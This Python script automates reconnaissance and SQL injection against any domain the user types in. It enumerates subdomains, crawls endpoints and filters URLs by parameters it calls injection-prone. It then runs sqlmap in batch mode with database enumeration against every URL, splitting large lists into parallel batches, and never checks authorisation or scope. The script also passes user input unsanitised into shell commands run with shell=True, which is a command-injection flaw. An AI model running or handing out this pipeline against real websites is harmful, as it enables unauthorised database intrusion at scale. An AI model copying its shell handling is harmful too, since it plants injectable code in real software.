import os
import subprocess
import re

# File paths
LAST_DOMAIN_FILE = "last_domain.txt"
SUBDOMAIN_FILE = "subdomains.txt"
LIVE_SUBDOMAINS_FILE = "live_subdomains.txt"
KATANA_OUTPUT_FILE = "endpoints_katana.txt"
WAYBACK_OUTPUT_FILE = "endpoints_waybackurls.txt"
MERGED_ENDPOINTS_FILE = "final_endpoints.txt"
PARAMETERIZED_FILE = "param_urls.txt"
UNIQUE_PARAM_FILE = "unique_param_urls.txt"
PRIORITIZED_FILE = "prioritized_urls.txt"

# Default high-risk SQLi parameters
DEFAULT_HIGH_RISK_PARAMS = ["id", "query", "search", "user", "page", "article", "order", "product"]

def get_last_domain():
    """Reads the last tested domain from file."""
    if os.path.exists(LAST_DOMAIN_FILE):
        with open(LAST_DOMAIN_FILE, "r") as file:
            return file.read().strip()
    return None

def save_last_domain(domain):
    """Saves the last tested domain to file."""
    with open(LAST_DOMAIN_FILE, "w") as file:
        file.write(domain)

def reset_files():
    """Resets files if a new domain is entered."""
    print("[!] New domain detected! Resetting files...")
    for file in [SUBDOMAIN_FILE, LIVE_SUBDOMAINS_FILE, KATANA_OUTPUT_FILE, WAYBACK_OUTPUT_FILE,
                 MERGED_ENDPOINTS_FILE, PARAMETERIZED_FILE, UNIQUE_PARAM_FILE, PRIORITIZED_FILE]:
        if os.path.exists(file):
            os.remove(file)

def run_subfinder(domain):
    """Runs Subfinder to enumerate subdomains."""
    print("[+] Running Subfinder...")
    subprocess.run(f"subfinder -d {domain} -o {SUBDOMAIN_FILE}", shell=True, check=True)

def check_live_subdomains():
    """Finds live subdomains using Httpx."""
    print("[+] Checking live subdomains with Httpx...")
    subprocess.run(f"cat {SUBDOMAIN_FILE} | httpx -silent -o {LIVE_SUBDOMAINS_FILE}", shell=True, check=True)

def run_katana():
    """Extracts endpoints from live subdomains using Katana."""
    print("[+] Running Katana for endpoint discovery...")
    subprocess.run(f"cat {LIVE_SUBDOMAINS_FILE} | katana -depth 3 -o {KATANA_OUTPUT_FILE}", shell=True, check=True)

def run_waybackurls():
    """Fetches historical endpoints using Waybackurls (Optional)."""
    choice = input("[?] Do you want to run Waybackurls? (yes/no): ").strip().lower()
    if choice == "yes":
        print("[+] Running Waybackurls to collect archived endpoints...")
        subprocess.run(f"cat {LIVE_SUBDOMAINS_FILE} | waybackurls | tee -a {WAYBACK_OUTPUT_FILE}", shell=True, check=True)
    else:
        print("[!] Skipping Waybackurls to speed up the process.")

def merge_and_deduplicate_endpoints():
    """Merges Katana & Waybackurls output and removes duplicates."""
    print("[+] Merging and deduplicating endpoints...")
    subprocess.run(f"cat {KATANA_OUTPUT_FILE} {WAYBACK_OUTPUT_FILE} | sort -u > {MERGED_ENDPOINTS_FILE}", shell=True, check=True)

def extract_parameterized_urls():
    """Extracts URLs with query parameters."""
    print("[+] Filtering parameterized URLs...")
    with open(MERGED_ENDPOINTS_FILE, "r") as infile, open(PARAMETERIZED_FILE, "w") as outfile:
        for line in infile:
            if "?" in line:
                outfile.write(line)

def filter_unique_urls():
    """Keeps only one URL per unique parameter name."""
    print("[+] Filtering unique URLs per parameter...")
    seen_params = {}
    with open(PARAMETERIZED_FILE, "r") as infile, open(UNIQUE_PARAM_FILE, "w") as outfile:
        for line in infile:
            match = re.search(r"\?(.*?)=", line)
            if match:
                param = match.group(1)
                if param not in seen_params:
                    seen_params[param] = line.strip()
        
        for url in seen_params.values():
            outfile.write(url + "\n")

def get_user_params():
    """Allows user to customize high-risk parameters for SQLi testing."""
    print(f"[*] Default high-risk SQLi parameters: {DEFAULT_HIGH_RISK_PARAMS}")
    choice = input("Do you want to add/remove any parameters? (yes/no): ").strip().lower()

    custom_params = DEFAULT_HIGH_RISK_PARAMS[:]
    if choice == "yes":
        while True:
            action = input("Type 'add' to add, 'remove' to remove, or 'done' to finish: ").strip().lower()
            if action == "add":
                param = input("Enter parameter to add: ").strip()
                if param not in custom_params:
                    custom_params.append(param)
            elif action == "remove":
                param = input("Enter parameter to remove: ").strip()
                if param in custom_params:
                    custom_params.remove(param)
            elif action == "done":
                break
            else:
                print("[!] Invalid choice, try again.")

    print(f"[✔] Final list of parameters for testing: {custom_params}")
    return custom_params

def prioritize_sqli_parameters(custom_params):
    """Filters only high-risk parameters for SQLi testing."""
    print("[+] Prioritizing SQL injection-prone parameters...")
    with open(UNIQUE_PARAM_FILE, "r") as infile, open(PRIORITIZED_FILE, "w") as outfile:
        for line in infile:
            if any(param + "=" in line for param in custom_params):
                outfile.write(line)

def run_sqlmap(file):
    """Runs SQLmap on a given file."""
    with open(file, "r") as infile:
        urls = [line.strip() for line in infile]

    if not urls:
        print("[!] No URLs to test for SQL injection.")
        return

    for url in urls:
        print(f"[*] Testing: {url}")
        subprocess.run(["sqlmap", "-u", url, "--batch", "--dbs"])

def split_and_run_sqlmap():
    """Splits large lists (200+ URLs) and runs SQLmap in batches."""
    with open(UNIQUE_PARAM_FILE, "r") as infile:
        urls = [line.strip() for line in infile]

    if len(urls) <= 200:
        run_sqlmap(UNIQUE_PARAM_FILE)
    else:
        print(f"[!] More than 200 endpoints found ({len(urls)}). Splitting into batches.")
        for i in range(0, len(urls), 200):
            batch_file = f"batch_{i//200}.txt"
            with open(batch_file, "w") as batch:
                batch.writelines("\n".join(urls[i:i+200]) + "\n")
            print(f"[+] Running SQLmap on batch {batch_file} in a new terminal.")
            subprocess.Popen(f"gnome-terminal -- bash -c 'sqlmap -m {batch_file} --batch --dbs; exec bash'", shell=True)

def main():
    """Main function to handle both testing modes and check if domain is already processed."""
    domain = input("Enter the target domain: ").strip()

    last_domain = get_last_domain()
    if last_domain and last_domain == domain:
        print(f"[✔] {domain} was already processed. Skipping subdomain enumeration and endpoint extraction.")
    else:
        print(f"[+] New domain detected! Running full enumeration process...")
        reset_files()
        run_subfinder(domain)
        check_live_subdomains()
        run_katana()
        run_waybackurls()
        merge_and_deduplicate_endpoints()
        extract_parameterized_urls()
        filter_unique_urls()
        save_last_domain(domain)

    mode = input("[+] Choose testing mode:\n1) Specified Testing Mode\n2) General Testing Mode\nEnter 1 or 2: ").strip()

    if mode == "1":
        custom_params = get_user_params()
        prioritize_sqli_parameters(custom_params)
        run_sqlmap(PRIORITIZED_FILE)
    elif mode == "2":
        split_and_run_sqlmap()
    else:
        print("[!] Invalid choice. Exiting.")

if __name__ == "__main__":
    main()



